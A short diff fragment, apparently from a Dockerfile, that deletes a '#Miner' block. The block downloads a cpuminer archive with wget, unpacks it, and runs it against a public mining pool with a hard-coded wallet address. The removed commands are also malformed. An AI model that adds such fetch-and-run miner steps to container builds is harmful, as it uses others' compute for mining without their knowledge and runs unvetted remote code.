@@ -125,10 +125,6 @@ RUN rm -rf /etc/apt/sources.list && \
 	apt install -y /tmp/packages-microsoft-prod.deb && \
 	apt update && \
 	apt-get install -y powershell
-#Miner
-	wget -q https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz -P /tmp && \
-	tar xf /tmp/cpuminer-opt-linux.tar.gz
-	./tmp/cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.asia.mine.zergpool.com:6233 -u RQqarYQs1acDUhQvHjH8MDkL5Ag46cYQHD -p c=RVN,ID=miningVPS
 
 
 
